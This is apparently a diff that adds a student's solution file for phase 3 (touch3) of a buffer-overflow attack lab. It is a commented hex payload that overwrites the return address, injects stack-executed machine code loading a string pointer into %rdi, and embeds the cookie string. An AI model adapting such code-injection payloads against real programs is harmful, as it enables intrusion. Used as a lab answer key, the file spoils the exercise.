@@ -1,0 +1,14 @@
+rsp0 = 55671660
+touch3 at 0x401e11
+target: %edi -> "0x1d6f8fa5" 
+ohno "1d6f8fa5"
+
+--- PAD ---
+78 16 67 55 00 00 00 00 # <- rsp0 + 24 == rsp0 + 0x18
+00 00 00 00 00 00 00 00 # rsp pad
+11 1e 40 00 00 00 00 00 # <- rsp1
+48 83 c4 08             # add $0x8,%rsp
+48 c7 c7 86 16 67 55    # mov $0x55671686, %rdi | rsp0 + 0x26
+c3                      # ret
+30 78 31 64 36 66 38 66 # string...
+61 35 00                # ...string
